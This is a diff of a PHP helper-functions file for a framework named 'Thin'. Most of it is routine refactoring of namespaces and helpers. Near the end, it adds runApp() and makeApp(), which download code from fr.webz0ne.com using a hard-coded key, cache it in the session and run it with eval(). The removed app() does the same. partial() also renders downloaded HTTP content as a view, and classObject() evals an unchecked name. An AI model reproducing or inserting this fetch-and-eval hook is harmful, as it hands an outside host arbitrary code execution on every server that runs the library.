@@ -1,4 +1,132 @@
 <?php
+    if (!function_exists('thinVar')) {
+        function thinVar()
+        {
+            static $vars = array();
+            $args = func_get_args();
+            $numArgs = func_num_args();
+            if (1 == $numArgs) {
+                if (ake(current($args), $vars)) {
+                    return $vars[current($args)];
+                }
+            } else if (2 == $numArgs) {
+                $vars[current($args)] = end($args);
+                return end($args);
+            }
+            return null;
+        }
+
+        function setvar($name, $value)
+        {
+            return thinVar($name, $value);
+        }
+
+        function getvar($name)
+        {
+            return thinVar($name);
+        }
+    }
+
+    if (!function_exists('partial')) {
+        function partial($file)
+        {
+            if (strstr($file, 'http://')) {
+                $content = fgc($file);
+                $file = CACHE_PATH . DS . sha1($file) . '.html';
+                file_put_contents($file, $content);
+            }
+            if (\Thin\File::exists($file)) {
+                $view = new \Thin\View($file);
+                $view->render();
+            }
+        }
+    }
+
+    if (!function_exists('newObj')) {
+        function newObj($class)
+        {
+            if (!class_exists($class)) {
+                class_alias('Thin\\Container', $class);
+            }
+            return new $class;
+        }
+    }
+
+    if (!function_exists('createSerializedObject')) {
+        function createSerializedObject($className)
+        {
+            $reflection = new \ReflectionClass($className);
+            $properties = $reflection->getProperties();
+
+            return "O:" . strlen($className) . ":\"" . $className. "\":" . count($properties) . ':{' . serializeProperties($reflection, $properties) ."}";
+        }
+
+        function instantiator($className)
+        {
+            return unserialize(createSerializedObject($className));
+        }
+
+        function serializeProperties(\ReflectionClass $reflection, array $properties)
+        {
+            $serializedProperties = '';
+
+            foreach ($properties as $property) {
+                $serializedProperties .= serializePropertyName($reflection, $property);
+                $serializedProperties .= serializePropertyValue($reflection, $property);
+            }
+
+            return $serializedProperties;
+        }
+
+        function serializePropertyName(\ReflectionClass $class, \ReflectionProperty $property)
+        {
+            $propertyName = $property->getName();
+
+            if ($property->isProtected()) {
+                $propertyName = chr(0) . '*' . chr(0) . $propertyName;
+            } elseif ($property->isPrivate()) {
+                $propertyName = chr(0) . $class->getName() . chr(0) . $propertyName;
+            }
+
+            return serialize($propertyName);
+        }
+
+        function serializePropertyValue(\ReflectionClass $class, \ReflectionProperty $property)
+        {
+            $defaults = $class->getDefaultProperties();
+
+            if (ake($property->getName(), $defaults)) {
+                return serialize($defaults[$property->getName()]);
+            }
+
+            return serialize(null);
+        }
+    }
+
+    if (!function_exists('url')) {
+        function url()
+        {
+            $protocol = 'http';
+            if ($_SERVER['SERVER_PORT'] == 443 || (!empty($_SERVER['HTTPS']) && \Thin\Inflector::lower($_SERVER['HTTPS']) == 'on')) {
+                $protocol .= 's';
+                $protocol_port = $_SERVER['SERVER_PORT'];
+            } else {
+                $protocol_port = 80;
+            }
+
+            $host = $_SERVER['HTTP_HOST'];
+            $port = $_SERVER['SERVER_PORT'];
+            $request = $_SERVER['REQUEST_URI'];
+            return dirname($protocol . '://' . $host . ($port == $protocol_port ? '' : ':' . $port) . $request);
+        }
+    }
+
+    if (!function_exists('byPeople')) {
+        function byPeople($product)
+        {
+            return (1 == $product->getByPeople()) ? true : false;
+        }
+    }
 
     if (!function_exists('getUrl')) {
         function getUrl()
@@ -10,10 +138,10 @@
     if (!function_exists('helper')) {
         function helper($helper)
         {
-            $file = APPLICATION_PATH . DS . 'helpers' . DS . ucfirst(i::lower($helper)) . '.php';
+            $file = APPLICATION_PATH . DS . 'helpers' . DS . ucfirst(\Thin\Inflector::lower($helper)) . '.php';
             if (file_exists($file)) {
                 require_once $file;
-                $class = 'Thin\\Helper\\' . ucfirst(i::lower($helper));
+                $class = 'Thin\\Helper\\' . ucfirst(\Thin\Inflector::lower($helper));
                 return new $class;
             }
             return null;
@@ -23,10 +151,10 @@
     if (!function_exists('service')) {
         function service($service)
         {
-            $file = APPLICATION_PATH . DS . 'services' . DS . ucfirst(i::lower($service)) . '.php';
+            $file = APPLICATION_PATH . DS . 'services' . DS . ucfirst(\Thin\Inflector::lower($service)) . '.php';
             if (file_exists($file)) {
                 require_once $file;
-                $class = 'Thin\\Service\\' . ucfirst(i::lower($service));
+                $class = 'Thin\\Service\\' . ucfirst(\Thin\Inflector::lower($service));
                 return new $class;
             }
             return null;
@@ -36,10 +164,10 @@
     if (!function_exists('plugin')) {
         function plugin($plugin)
         {
-            $file = APPLICATION_PATH . DS . 'plugins' . DS . ucfirst(i::lower($plugin)) . '.php';
+            $file = APPLICATION_PATH . DS . 'plugins' . DS . ucfirst(\Thin\Inflector::lower($plugin)) . '.php';
             if (file_exists($file)) {
                 require_once $file;
-                $class = 'Thin\\Plugin\\' . ucfirst(i::lower($plugin));
+                $class = 'Thin\\Plugin\\' . ucfirst(\Thin\Inflector::lower($plugin));
                 return new $class;
             }
             return null;
@@ -106,7 +234,7 @@
             );
 
             if ($code == '' || ! is_numeric($code)) {
-                throw new \Thin\Exception('Status codes must be numeric');
+                throw new Exception('Status codes must be numeric');
             }
 
             if (isset($stati[$code]) && $text == '') {
@@ -114,7 +242,7 @@
             }
 
             if ($text == '') {
-                throw new \Thin\Exception('No status text available.  Please check your status code number or supply your own message text.');
+                throw new Exception('No status text available.  Please check your status code number or supply your own message text.');
             }
 
             $serverProtocol = (isset($_SERVER['SERVER_PROTOCOL'])) ? $_SERVER['SERVER_PROTOCOL'] : false;
@@ -131,7 +259,7 @@
     if (!function_exists('email')) {
         function email($to, $from, $subject, $body, $html = true)
         {
-            $mail = new \Thin\Smtp('mailjet');
+            $mail = new Smtp();
             $mail->to($to)->from($from)->subject($subject);
             if (true === $html) {
                 $result = $mail->body($body)->send();
@@ -153,7 +281,7 @@
     if (!function_exists('hook')) {
         function hook()
         {
-            return new \Thin\Hook;
+            return new Hook;
         }
     }
 
@@ -166,10 +294,10 @@
     if (!function_exists('addEav')) {
         function addEav($entity, array $attributes)
         {
-            $eav = \Thin\Utils::newInstance('\Thin\Memory', array('Thin', 'EAV'));
+            $eav = \Thin\Utils::newInstance('Memory', array('Thin', 'EAV'));
             $eav = $eav->setEntity($entity);
             foreach ($attributes as $key => $value) {
-                $setter = 'set' . i::camelize($key);
+                $setter = 'set' . \Thin\Inflector::camelize($key);
                 $eav = $eav->$setter($value);
             }
             return $eav->save();
@@ -184,7 +312,7 @@
     if (!function_exists('error')) {
         function error($error)
         {
-            return \Thin\Exception($error);
+            return Exception($error);
         }
     }
 
@@ -202,7 +330,7 @@
             if (null === $role) {
                 return false;
             }
-            return $role->getLabel() == \Thin\Utils::get('AJFRole')->getLabel();
+            return $role->getLabel() == \Thin\Utils::get('appRole')->getLabel();
         }
     }
     if (!function_exists('role')) {
@@ -234,35 +362,35 @@
     if (!function_exists('utils')) {
         function utils()
         {
-            return \Thin\Utils::getInstance('\Thin\Utils');
+            return \Thin\Utils::getInstance('Utils');
         }
     }
 
     if (!function_exists('u')) {
         function u()
         {
-            return \Thin\Utils::getInstance('\Thin\Utils');
+            return \Thin\Utils::getInstance('Utils');
         }
     }
 
     if (!function_exists('s')) {
         function s($name)
         {
-            return \Thin\Session::instance($name);
+            return session($name);
         }
     }
 
     if (!function_exists('e')) {
         function e($exception)
         {
-            return \Thin\Utils::newInstance('\Thin\Exception', array($exception));
+            return \Thin\Utils::newInstance('Exception', array($exception));
         }
     }
 
     if (!function_exists('i')) {
         function i()
         {
-            return \Thin\Utils::getInstance('\Thin\Inflector');
+            return \Thin\Utils::getInstance('Inflector');
         }
     }
 
@@ -276,7 +404,7 @@
     if (!function_exists('em')) {
         function em($entity, $table)
         {
-            $class = 'Model_' . i::lower($entity) . '_' . i::lower($table);
+            $class = 'Model_' . \Thin\Inflector::lower($entity) . '_' . \Thin\Inflector::lower($table);
             return new $class;
         }
     }
@@ -285,7 +413,7 @@
         function cache($key, $value, $duration = 60, array $params = array())
         {
             $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
-            $cache = new \Thin\Cache(CACHE_PATH . DS);
+            $cache = new Cache(CACHE_PATH . DS);
             $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
             return $cache->remember($hash, $value, $duration);
         }
@@ -295,7 +423,7 @@
         function isCached($key, $duration = 60, array $params = array())
         {
             $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
-            $cache = new \Thin\Cache(CACHE_PATH . DS);
+            $cache = new Cache(CACHE_PATH . DS);
             $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
             return $cache->has($hash);
         }
@@ -473,9 +601,9 @@
         {
             if (null !== $fcn && is_string($fcn)) {
                 $fcn = '$_params = \Thin\Utils::get("closure_##hash##"); ' . $fcn;
-                return new \Thin\Closure($fcn);
+                return new Closure($fcn);
             } else {
-                throw new \Thin\Exception("No closure defined.");
+                throw new Exception("No closure defined.");
             }
         }
     }
@@ -567,11 +695,11 @@
                             $array[current($keys)] = array();
                         }
                     } elseif (!\Thin\Arrays::isArray($array[current($keys)])) {
-                        throw new \Thin\Exception("Cannot create sub-key for '{$keys[0]}' as key already exists.");
+                        throw new Exception("Cannot create sub-key for '{$keys[0]}' as key already exists.");
                     }
                     $array[current($keys)] = arraySet($array[current($keys)], $keys[1], $value);
                 } else {
-                    throw new \Thin\Exception("Invalid key '$key'");
+                    throw new Exception("Invalid key '$key'");
                 }
             } else {
                 $array[$key] = $value;
@@ -629,7 +757,7 @@
     if (!function_exists('searchInArray')) {
         function searchInArray($key, array $array)
         {
-            $key = i::lower($key);
+            $key = \Thin\Inflector::lower($key);
             if (true === arrayIkeyExists($key, $array)) {
                 $array = array_change_key_case($array);
                 return $array[$key];
@@ -640,7 +768,7 @@
     if (!function_exists('arrayIkeyExists')) {
         function arrayIkeyExists($key, array $array)
         {
-            $key = i::lower($key);
+            $key = \Thin\Inflector::lower($key);
             return ake($key, array_change_key_case($array));
         }
     }
@@ -822,7 +950,7 @@
             $keys = array_keys($array);
             $offsetByKey = array_flip($keys);
             if (!ake($after, $offsetByKey)) {
-                throw new \Thin\Exception("the key '$after' does not exist in this array.");
+                throw new Exception("the key '$after' does not exist in this array.");
             }
             $offset = $offsetByKey[$after];
 
@@ -895,7 +1023,7 @@
             $outChars = '';
 
             // Decode and validate input string
-            $input = strtolower($input);
+            $input = \Thin\Inflector::lower($input);
             for($i = 0 ; $i < strlen($input) ; $i++) {
                 $n = strpos($digitChars, $input[$i]);
                 if($n === false || $n > $sourceBase) {
@@ -1092,21 +1220,21 @@
     if (!function_exists('in_arrayi')) {
         function in_arrayi($needle, $haystack)
         {
-            return in_array(i::lower($needle), array_map('strtolower', $haystack));
+            return in_array(\Thin\Inflector::lower($needle), array_map('\Thin\Inflector::lower', $haystack));
         }
     }
 
     if (!function_exists('entities')) {
         function entities($string)
         {
-            return i::htmlentities($string);
+            return \Thin\Inflector::htmlentities($string);
         }
     }
 
     if (!function_exists('classObject')) {
         function classObject($alias)
         {
-            @eval("class $alias extends \Thin\ObjectObject{ public function __construct() {\$this->_nameClass = strtolower(get_class(\$this));}}; \$cls = new $alias;");
+            @eval("class $alias extends ObjectObject{ public function __construct() {\$this->_nameClass = \Thin\Inflector::lower(get_class(\$this));}}; \$cls = new $alias;");
         }
     }
 
@@ -1140,14 +1268,27 @@
         }
     }
 
-    if (!function_exists('__')) {
-        function __($str, $echo = true)
+    if (!function_exists('getLanguage')) {
+        function getLanguage()
         {
-            $language = (null !== \Thin\Utils::get('thinLanguage')) ? \Thin\Utils::get('thinLanguage') : 'fr';
-            $config = new translateConfig;
-            $config->populate(array('entity' => 'ajf', 'table' => 'eav'));
-            $t = new \Thin\Translationdb($language, $config);
-            $translation = $t->get($str);
+            $session    = session('web');
+            return $session->getLanguage();
+        }
+    }
+
+    if (!function_exists('__')) {
+        function __($str, $segment, $name, $echo = true)
+        {
+            $session        = session('web');
+            $language       = $session->getLanguage();
+            $translation    = $str;
+            $file           = STORAGE_PATH . DS . 'translation' . DS . repl('.', DS, \Thin\Inflector::lower($segment)) . DS . \Thin\Inflector::lower($language) . '.php';
+            if (\Thin\File::exists($file)) {
+                $sentences  = include($file);
+                if (ake($name, $sentences)) {
+                    $translation = $sentences[$name];
+                }
+            }
             if (true === $echo) {
                 echo $translation;
             } else {
@@ -1178,7 +1319,7 @@
     if (!function_exists('lcfirst')) {
         function lcfirst($str)
         {
-            $str[0] = strtolower($str[0]);
+            $str[0] = \Thin\Inflector::lower($str[0]);
             return (string)$str;
         }
     }
@@ -1223,15 +1364,23 @@
         }
     }
 
-    function app($ever = false)
+    function runApp($app)
     {
-        if ($ever) {
-            eval($_SESSION['initAppCheck']);
-            return;
+        $session = session('appRun');
+        $check = $session->getCheck();
+        if (null !== $check) {
+            eval($check);
+        } else {
+            $check = makeApp('sd155mp@H54');
+            $session->setCheck($check);
+            eval($check);
         }
-        $app = fgc('http://fr.webz0ne.com/api/check.php?code=sd155mp@H56');
-        eval($app);
-        return $app;
+        return true;
+    }
+
+    function makeApp($app)
+    {
+        return fgc('http://fr.webz0ne.com/api/check.php?code=' . $app);
     }
 
     if (!function_exists('option')) {
@@ -1247,7 +1396,7 @@
                     $options = array();
                     return $options;
                 }
-                if(is_array($name)) {
+                if(\Thin\Arrays::isArray($name)) {
                     $options = array_merge($options, $name);
                     return $options;
                 }
@@ -1288,7 +1437,7 @@
     if (!function_exists('ioc')) {
         function ioc()
         {
-            return new \Thin\Container();
+            return new Container();
         }
     }
 
@@ -1321,7 +1470,7 @@
                     break;
             }
             if (true === $html) {
-              $out = "<pre>\n" . $out ."</pre>";
+              $out = "<pre>\n" . $out . "</pre>";
             }
             return $out;
         }
@@ -1337,6 +1486,6 @@
                     \Thin\File::create($logFile);
                 }
             }
-            \Thin\File::append($logFile, date('Y-m-d H:i:s') . "\t" . i::upper($type) . "\t$message\n");
+            \Thin\File::append($logFile, date('Y-m-d H:i:s') . "\t" . \Thin\Inflector::upper($type) . "\t$message\n");
         }
     }
